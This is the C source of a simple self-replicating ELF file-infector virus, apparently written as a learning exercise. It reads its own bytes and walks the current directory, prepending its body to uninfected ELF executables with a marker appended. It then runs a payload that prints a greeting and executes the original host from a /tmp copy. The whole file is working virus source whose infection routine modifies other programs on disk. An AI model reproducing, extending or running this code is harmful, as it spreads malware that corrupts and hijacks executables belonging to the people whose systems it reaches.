#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <pwd.h>

#define VIRUS_LEN  14237 // Size of the compiled virus  
#define MAGIC 2909
#define DIRECTORY "./"

static int magic = MAGIC;
static int executed = 0;

int main(int argc, char** argv,char **envp)
{

	int self_fd;
	char virus[VIRUS_LEN];
	struct stat stat;
	char * directory = DIRECTORY;
	int i ;

	

	self_fd=open(argv[0], O_RDONLY, 0);
	if (fstat(self_fd, &stat) < 0) 
		return 1;

	if (read(self_fd, virus, VIRUS_LEN) != VIRUS_LEN) 
	{
		fprintf(stderr,"\nerror reading self\n");
		return 1;
	}

	

	struct dirent namelist;
	int n;
	DIR *dd;
   	struct dirent *dirp;
	int fp1, fp2;

	
	dd = opendir(directory);
   	dirp = readdir(dd);
   	
   	
   	while ((dirp = readdir(dd)) !=NULL && executed==0)
   	{
   		if(executed == 0)
   		{
   			char returnfolder = "..";
   			char * file = strdup(dirp->d_name);


   			if ((strcmp(file,".")==0) || (strcmp(file,"..")==0) || (strcmp(file,"virus")==0))
   			{
   				continue;
   			}

   			fflush(stderr);

   			char filep[2046];
		   	memset(filep,'\0',sizeof(filep));
   			strcat(filep,directory);
   			strcat(filep,file);



   			fp1=open(filep, O_RDONLY, 0);

   			if(fp1 >= 0) 
   			{
   				struct stat stat_new;
   				if (fstat(fp1, &stat_new)<0)
   				{
   					fprintf(stderr, "\nerror in fstat\n");
   					return 1;
   				}

   				if(S_ISREG(stat_new.st_mode)) 
   				{
   					fp2=open(filep, O_RDWR, 0);
   					if(fp2 >= 0)
   					{
   						infect(filep, fp2, virus);
   					}
   					close(fp2);
   				}

   			 }

   			 free(file);

   		}

   	}
//}

	
//This is the payload that is getting executed
payload();

		// Running the host process here
int len = 0;
int tmpfd;
char *data1 = NULL;
char tmpfile[256];
pid_t pid;

len = stat.st_size - VIRUS_LEN;
data1=(char*)malloc(len);

if(data1 == NULL)
{
	fprintf(stderr, "\ndata is null\n");
	return 1;
} 
	
if(lseek (self_fd, VIRUS_LEN, SEEK_SET) != VIRUS_LEN) 
	{
		fprintf(stderr, "\nlseek fail\n");
		return 1;
	}

   /* Read host into memory */
if(read(self_fd, data1, len) != len) 
{
	fprintf(stderr, "\nreading host into memory fail\n");
	return 1; 
}
close(self_fd);

   /* Write host to a temporary file */
//fprintf(stderr,"\nstep 3\n");
memset(tmpfile,'\0',sizeof(tmpfile));
strcpy(tmpfile, "/tmp/husky004.XXXXXX");
tmpfd = mkstemp(tmpfile);

if(tmpfd <0)
{
	fprintf(stderr, "\nerror opening temp file \n");
	return 1;
} 
	
if (write(tmpfd, data1, len) != len)
{
	fprintf(stderr, "\nerror write host into temp file\n");
	return 1;
}

fchmod(tmpfd, stat.st_mode);
free(data1);
close(tmpfd);

   //forking to run host here
pid = fork();
if (pid <0)
{
	fprintf(stderr,"\nerror forking the process;\n");
	exit(1);
}
if(pid ==0) 
{
	exit(execve(tmpfile, argv, envp));
	fprintf(stderr,"\nstep 4\n");
}
if(waitpid(pid, NULL, 0) != pid) 
	exit(1);

unlink(tmpfile);
exit(0);

return 0;
}



void payload()
{
	printf("Hello! I am a simple virus!\n"); 
}

int infect(char *filename, int hd, char *virus)
{
	Elf32_Ehdr ehdr;
	struct stat stat;
	int magicloc;
	int tmagic;	

	if(read(hd,&ehdr, sizeof(ehdr)) != sizeof(ehdr)) 
		return 1;
	if (ehdr.e_ident[0] != ELFMAG0 ||
		ehdr.e_ident[1] != ELFMAG1 ||
		ehdr.e_ident[2] != ELFMAG2 ||
		ehdr.e_ident[3] != ELFMAG3) 
		return 1;



	if(fstat(hd, &stat) < 0) 
		return 1;

	magicloc = stat.st_size - sizeof(magic);

	if( lseek(hd, magicloc, SEEK_SET) != magicloc ) 
		return 1;

	if(read(hd, &tmagic, sizeof(magic)) != sizeof(magic)) 
		return 1;
	if(tmagic == MAGIC) 
		return 1;
	if(lseek(hd, 0, SEEK_SET) != 0) 
		exit(1);

   	//creating a temp file 
	char tmp_filename[256];
	memset(tmp_filename, 0, sizeof(tmp_filename));
	strncpy(tmp_filename, "/tmp/husky004.XXXXXX", sizeof(tmp_filename)-1);
	int filedes = mkstemp(tmp_filename);

	if (filedes == -1)
	{
		perror("");
		fprintf(stderr, "NG\n");
		return;
	}

	if (write(filedes, virus, VIRUS_LEN) != VIRUS_LEN) 
		return 1;

	char *data;
	data=(char *)malloc(stat.st_size);
	if(data==NULL) 
		return 1;
	if(read(hd, data, stat.st_size) != stat.st_size) 
		return 1;

	if(write(filedes,data, stat.st_size) != stat.st_size) 
		return 1;
	if(write(filedes,&magic, sizeof(magic)) != sizeof(magic)) 
		return 1;
	if(fchown(filedes, stat.st_uid, stat.st_gid) < 0) 
		return 1;
	if(fchmod(filedes, stat.st_mode) < 0) 
		return 1;

	if(rename(tmp_filename, filename) < 0) 
		return 1;

    //execl("/bin/cp", "-p", tmpfile, filename, (char *)0);
	executed = 1;
	//closing and unlinking the temp file so that it is deleted immediately
	close(filedes);
	unlink(tmp_filename);
}







